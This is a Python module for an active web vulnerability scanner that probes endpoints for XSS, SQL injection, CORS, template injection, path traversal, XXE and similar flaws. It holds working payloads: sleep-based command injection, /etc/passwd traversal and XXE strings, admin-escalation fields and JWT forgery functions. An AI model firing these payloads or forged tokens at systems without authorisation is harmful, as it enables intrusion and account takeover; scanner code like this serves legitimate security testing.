"""
CyvoraX Suite - Active Scanner module
Automated checks run against a target request: reflected XSS, SQLi error
signatures, missing security headers, open redirect, and basic info
disclosure. Each check is a real probe + real detection logic, not a stub.
"""
import re
import hashlib
import base64
import hmac
import json
import urllib.parse
import time
from dataclasses import dataclass
from typing import List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from modules.repeater import send_raw_request

SQLI_ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-01756", "sqlite3.operationalerror",
    "unclosed quotation mark", "pg_query", "sqlstate", "syntax error near",
    "warning: mysql", "microsoft ole db provider for odbc drivers"
]

SECURITY_HEADERS = [
    "content-security-policy", "x-frame-options", "x-content-type-options",
    "strict-transport-security", "referrer-policy", "permissions-policy",
]

XSS_MARKER = "cyvoraxXSS1337"


@dataclass
class Finding:
    check: str
    severity: str  # info, low, medium, high
    detail: str
    evidence: str = ""


def _split_headers_body(raw_response: str):
    if "\r\n\r\n" in raw_response:
        head, body = raw_response.split("\r\n\r\n", 1)
    else:
        head, body = raw_response, ""
    return head, body


def check_security_headers(raw_response: str) -> List[Finding]:
    head, _ = _split_headers_body(raw_response)
    head_lower = head.lower()
    findings = []
    for h in SECURITY_HEADERS:
        if h + ":" not in head_lower:
            findings.append(Finding(
                check="Missing Security Header",
                severity="low",
                detail=f"Response is missing the '{h}' header",
            ))
    return findings


def check_sqli_error_signatures(raw_response: str) -> List[Finding]:
    _, body = _split_headers_body(raw_response)
    body_lower = body.lower()
    findings = []
    for sig in SQLI_ERROR_SIGNATURES:
        if sig in body_lower:
            findings.append(Finding(
                check="SQL Injection (error-based)",
                severity="high",
                detail=f"Response body contains a database error signature",
                evidence=sig,
            ))
    return findings


def check_reflected_xss(raw_response: str, marker: str = XSS_MARKER) -> List[Finding]:
    _, body = _split_headers_body(raw_response)
    findings = []
    # only a finding if the marker appears WITHOUT being HTML-encoded
    if marker in body and f"&lt;{marker}" not in body:
        # crude check: was it reflected inside an unescaped context near < or "
        idx = body.find(marker)
        context = body[max(0, idx - 20):idx + len(marker) + 20]
        if "<" in context or ">" in context or '"' in context:
            findings.append(Finding(
                check="Reflected XSS",
                severity="high",
                detail="Injected marker reflected unencoded in response body",
                evidence=context.strip(),
            ))
    return findings


def check_open_redirect(location_header: str, injected_url: str, original_host: str = "") -> List[Finding]:
    """injected_url: the off-site URL/host you injected as a redirect param value.
    original_host: the legit site's host, so we don't false-positive on same-site redirects."""
    if not location_header:
        return []
    injected_host = urllib.parse.urlparse(injected_url).netloc or injected_url.split("://")[-1]
    target_host = urllib.parse.urlparse(location_header).netloc
    if injected_host and injected_host in location_header and target_host != original_host:
        return [Finding(
            check="Open Redirect",
            severity="medium",
            detail=f"Location header reflects attacker-controlled redirect target '{injected_host}'"
                   + (f" (legit host is '{original_host}')" if original_host else ""),
            evidence=location_header,
        )]
    return []


CORS_TEST_ORIGIN = "https://cyvorax-evil.test"

SSTI_PAYLOADS = {
    "{{7*7}}": "49",
    "${7*7}": "49",
    "#{7*7}": "49",
    "<%= 7*7 %>": "49",
}

CMDI_TIME_PAYLOADS = [
    ("; sleep 5", 4.5),
    ("| sleep 5", 4.5),
    ("$(sleep 5)", 4.5),
    ("& ping -n 6 127.0.0.1 &", 4.5),
]

SENSITIVE_DATA_PATTERNS = {
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key": r"(?i)aws(.{0,20})?(secret|private)?[_-]?key[\"'\s:=]{1,4}[A-Za-z0-9/+=]{40}",
    "Generic API Key": r"(?i)api[_-]?key[\"'\s:=]{1,4}[A-Za-z0-9\-_]{16,45}",
    "Private Key Block": r"-----BEGIN (RSA|EC|DSA|OPENSSH|PGP) PRIVATE KEY-----",
    "JWT": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
    "Slack Token": r"xox[baprs]-[0-9A-Za-z-]{10,}",
}


def check_cors_misconfiguration(headers: list, test_origin: str = CORS_TEST_ORIGIN) -> List[Finding]:
    """Flags reflected/wildcard Access-Control-Allow-Origin, esp. combined with credentials."""
    hmap = {k.lower(): v for k, v in headers}
    acao = hmap.get("access-control-allow-origin", "")
    acac = hmap.get("access-control-allow-credentials", "").lower() == "true"
    findings = []
    if acao == "*" and acac:
        findings.append(Finding("CORS Misconfiguration", "high",
            "Wildcard ACAO combined with Allow-Credentials: true (invalid per spec, but some "
            "stacks honor it - full credentialed cross-origin read).", evidence=f"ACAO: {acao}"))
    elif acao == test_origin:
        findings.append(Finding("CORS Misconfiguration", "high" if acac else "medium",
            f"Server reflects arbitrary Origin header back in ACAO{' with credentials allowed' if acac else ''}.",
            evidence=f"ACAO: {acao}, Allow-Credentials: {acac}"))
    elif acao == "null":
        findings.append(Finding("CORS Misconfiguration", "medium",
            "Server allows 'null' origin (exploitable via sandboxed iframes / file:// origins).",
            evidence="ACAO: null"))
    return findings


def check_clickjacking(headers: list) -> List[Finding]:
    hmap = {k.lower(): v for k, v in headers}
    xfo = hmap.get("x-frame-options", "")
    csp = hmap.get("content-security-policy", "")
    if not xfo and "frame-ancestors" not in csp.lower():
        return [Finding("Clickjacking", "medium",
            "No X-Frame-Options header and no CSP frame-ancestors directive; "
            "page can likely be framed by an attacker-controlled page.")]
    return []


def check_ssti(response_body: str, marker_map: dict = None) -> List[Finding]:
    """Pass the response body from a request where you injected each SSTI payload
    as a param value; call once per payload/response pair."""
    marker_map = marker_map or SSTI_PAYLOADS
    findings = []
    for payload, expected in marker_map.items():
        if expected in response_body and payload not in response_body:
            findings.append(Finding("Server-Side Template Injection", "high",
                f"Payload '{payload}' was evaluated server-side (found '{expected}' in response, "
                "raw payload absent).", evidence=expected))
    return findings


def check_command_injection_timing(baseline_elapsed: float, injected_elapsed: float,
                                    payload: str, threshold: float = 4.0) -> List[Finding]:
    """Compare response time of a baseline request vs one with a sleep-based payload."""
    delta = injected_elapsed - baseline_elapsed
    if delta >= threshold:
        return [Finding("OS Command Injection (blind, time-based)", "high",
            f"Response delayed by {delta:.2f}s relative to baseline after injecting a sleep payload.",
            evidence=payload)]
    return []


def check_sensitive_data_exposure(raw_response: str) -> List[Finding]:
    _, body = _split_headers_body(raw_response)
    findings = []
    for label, pattern in SENSITIVE_DATA_PATTERNS.items():
        m = re.search(pattern, body)
        if m:
            snippet = m.group(0)
            redacted = snippet[:6] + "..." + snippet[-4:] if len(snippet) > 12 else snippet
            findings.append(Finding("Sensitive Data Exposure", "high",
                f"Response body matches pattern for {label}.", evidence=redacted))
    return findings


LFI_MARKERS = {
    "../../../../../../etc/passwd": ["root:x:0:0:", "root:*:0:0:"],
    "..\\..\\..\\..\\windows\\win.ini": ["[fonts]", "[extensions]"],
    "....//....//....//....//etc/passwd": ["root:x:0:0:"],
}

XXE_TEST_PAYLOAD = (
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM '
    '"file:///etc/passwd">]><data>&xxe;</data>'
)
XXE_MARKERS = ["root:x:0:0:", "root:*:0:0:"]

MASS_ASSIGNMENT_PROPS = {
    "isAdmin": True, "is_admin": True, "role": "admin", "admin": True,
    "isVerified": True, "is_verified": True, "accountBalance": 999999,
    "permissions": ["admin"], "userRole": "administrator",
}

GRAPHQL_INTROSPECTION_QUERY = (
    '{"query":"query IntrospectionQuery { __schema { queryType { name } '
    'mutationType { name } types { name kind fields { name } } } }"}'
)


def check_host_header_injection(original_response_body: str, poisoned_response_body: str,
                                 injected_host: str) -> List[Finding]:
    if injected_host in poisoned_response_body and injected_host not in original_response_body:
        return [Finding("Host Header Injection", "high",
            f"Injected Host '{injected_host}' was reflected into the response body "
            "(password-reset link poisoning / cache poisoning risk).",
            evidence=injected_host)]
    return []


def check_xxe(response_body: str) -> List[Finding]:
    for marker in XXE_MARKERS:
        if marker in response_body:
            return [Finding("XML External Entity (XXE) Injection", "critical",
                "Server resolved an external entity and leaked local file contents.",
                evidence=marker)]
    return []


def check_lfi(response_body: str, payload: str = None) -> List[Finding]:
    candidates = {payload: LFI_MARKERS[payload]} if payload else LFI_MARKERS
    findings = []
    for pl, markers in candidates.items():
        if pl is None:
            continue
        for marker in markers:
            if marker in response_body:
                findings.append(Finding("Local File Inclusion / Path Traversal", "high",
                    f"Payload '{pl}' returned recognizable local file contents.",
                    evidence=marker))
                break
    return findings


def check_csrf_protection(headers: list, body: str = "") -> List[Finding]:
    hmap = {k.lower(): v for k, v in headers}
    findings = []
    set_cookie = hmap.get("set-cookie", "")
    if set_cookie and "samesite" not in set_cookie.lower():
        findings.append(Finding("CSRF - Missing SameSite", "medium",
            "Session cookie set without a SameSite attribute, weakening CSRF defenses.",
            evidence=set_cookie[:60]))
    token_markers = ["csrf", "xsrf", "_token", "authenticity_token"]
    if body and not any(m in body.lower() for m in token_markers):
        findings.append(Finding("CSRF - No Token Found", "low",
            "No anti-CSRF token field/name detected in the form/request body.",
            evidence="checked for: " + ", ".join(token_markers)))
    return findings


def check_sri_missing(html_body: str) -> List[Finding]:
    findings = []
    for tag_re, kind in [
        (r'<script[^>]+src=["\']https?://[^"\']+["\'][^>]*>', "script"),
        (r'<link[^>]+rel=["\']stylesheet["\'][^>]+href=["\']https?://[^"\']+["\'][^>]*>', "stylesheet"),
    ]:
        for m in re.finditer(tag_re, html_body, re.IGNORECASE):
            tag = m.group(0)
            if "integrity=" not in tag.lower():
                findings.append(Finding("Missing Subresource Integrity (SRI)", "low",
                    f"Third-party {kind} loaded without an integrity attribute.",
                    evidence=tag[:100]))
    return findings


def check_graphql_introspection(response_body: str) -> List[Finding]:
    if '"__schema"' in response_body and '"types"' in response_body:
        return [Finding("GraphQL Introspection Enabled", "medium",
            "The __schema introspection query succeeded; full schema (types, "
            "fields, mutations) can likely be dumped by an attacker.",
            evidence="__schema present in response")]
    return []


def build_mass_assignment_payload(base_payload: dict, extra_props: dict = None) -> dict:
    merged = dict(base_payload)
    merged.update(extra_props or MASS_ASSIGNMENT_PROPS)
    return merged


def check_mass_assignment(original_response_json: dict, injected_response_json: dict,
                           injected_keys: list = None) -> List[Finding]:
    injected_keys = injected_keys or list(MASS_ASSIGNMENT_PROPS.keys())
    findings = []
    for key in injected_keys:
        before = original_response_json.get(key)
        after = injected_response_json.get(key)
        if after is not None and after != before and after == MASS_ASSIGNMENT_PROPS.get(key, after):
            findings.append(Finding("Mass Assignment / Over-Posting", "high",
                f"Server accepted client-supplied '{key}' field (value: {after!r}), "
                "indicating no server-side allowlist on writable fields.",
                evidence=f"{key}={after!r}"))
    return findings


def jwt_none_alg_exploit(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    def _b64url(obj):
        raw = json.dumps(obj, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
    return f"{_b64url(header)}.{_b64url(payload)}."


def jwt_key_confusion_exploit(payload: dict, rsa_public_key_pem: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    def _b64url(obj_bytes):
        return base64.urlsafe_b64encode(obj_bytes).rstrip(b"=").decode()
    header_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.HMAC(rsa_public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{_b64url(sig)}"


def build_injected_url(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def scan_endpoint(host: str, port: int, path: str, use_tls: bool,
                   params_to_test: List[str] = None, delay_s: float = 0.05) -> List[Finding]:
    """
    Run the full active check suite against one endpoint. path may include
    an existing query string; each param in params_to_test gets probed with
    both an XSS marker and a SQLi quote, one request per probe.
    """
    all_findings: List[Finding] = []

    def send(p):
        req = f"GET {p} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        return send_raw_request(host, port, req, use_tls=use_tls, timeout=10)

    # baseline request - passive checks (headers)
    baseline = send(path)
    all_findings += check_security_headers(baseline)

    if not params_to_test:
        return all_findings

    for param in params_to_test:
        xss_url = build_injected_url(f"http://x{path}", param, XSS_MARKER)
        xss_path = xss_url.split("x", 1)[1] if xss_url.startswith("http://x") else path
        resp = send(urlparse(xss_url).path + "?" + urlparse(xss_url).query)
        all_findings += check_reflected_xss(resp)
        time.sleep(delay_s)

        sqli_url = build_injected_url(f"http://x{path}", param, "'")
        resp2 = send(urlparse(sqli_url).path + "?" + urlparse(sqli_url).query)
        all_findings += check_sqli_error_signatures(resp2)
        time.sleep(delay_s)

    return all_findings
